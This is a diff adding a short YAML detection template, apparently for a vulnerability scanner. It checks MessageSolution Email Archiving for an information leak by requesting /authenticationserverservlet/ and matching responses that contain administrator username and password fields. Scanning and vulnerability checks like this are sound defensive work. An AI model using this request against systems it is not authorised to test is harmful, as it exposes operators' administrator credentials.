@@ -1,0 +1,17 @@
+id: poc-yaml-messagesolution-email-archiving-info-leak
+info:
+  name: MessageSolution Email Archiving 信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: MessageSolution
+  osprey-id: vb_2021_0012
+requests:
+- method: GET
+  path: /authenticationserverservlet/
+  expression: 'status_code == 200 && contains(body, "<administratorusername") && contains(body,
+    "<administratorpassword>")
+
+    '
+variables: {}
+transport: http
